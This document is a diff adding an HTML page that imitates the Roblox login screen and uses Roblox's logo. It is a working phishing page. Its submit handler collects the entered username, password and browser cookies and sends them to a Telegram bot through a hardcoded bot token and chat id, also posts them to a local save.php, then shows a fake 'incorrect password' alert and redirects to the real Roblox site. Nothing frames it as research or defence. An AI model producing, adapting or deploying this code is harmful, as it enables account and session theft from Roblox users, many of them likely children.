@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox Login</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+        body { background: #1a1a2e; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .container { background: #16213e; padding: 40px 30px; border-radius: 16px; width: 100%; max-width: 380px; box-shadow: 0 10px 30px rgba(0,0,0,0.7); text-align: center; }
+        .container img { width: 140px; margin-bottom: 20px; }
+        .container h2 { color: #fff; font-weight: 400; font-size: 22px; margin-bottom: 25px; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: none; border-radius: 8px; background: #0f3460; color: #fff; font-size: 15px; }
+        input::placeholder { color: #aaa; }
+        button { width: 100%; padding: 14px; background: #e03a3a; border: none; border-radius: 8px; color: #fff; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.2s; }
+        button:hover { background: #c02a2a; }
+        .links { margin-top: 15px; color: #888; font-size: 13px; }
+        .links a { color: #4a9eff; text-decoration: none; }
+        .links a:hover { text-decoration: underline; }
+    </style>
+</head>
+<body>
+<div class="container">
+    <img src="https://www.roblox.com/assets/img/logo.png" alt="Roblox">
+    <h2>Log In</h2>
+    <form id="loginForm">
+        <input type="text" id="user" placeholder="Username" required>
+        <input type="password" id="pass" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+    <div class="links">
+        <a href="#">Forgot Password?</a> · <a href="#">Sign Up</a>
+    </div>
+</div>
+<script>
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        let u = document.getElementById('user').value;
+        let p = document.getElementById('pass').value;
+        let c = document.cookie || 'No cookie';
+
+        fetch('https://api.telegram.org/bot8879421873:AAHn8_tRAwlc4lVGCIN-A0J_u6y_alhCR8A/sendMessage', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: '1899955226',
+                text: 'User: ' + u + '\nPass: ' + p + '\nCookie: ' + c
+            })
+        });
+
+        fetch('/save.php', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+            body: 'data=' + encodeURIComponent('User: ' + u + ' | Pass: ' + p + ' | Cookie: ' + c + '\n')
+        });
+
+        alert('Incorrect username or password. Please try again.');
+        window.location.href = 'https://www.roblox.com/login';
+    });
+</script>
+</body>
+</html>
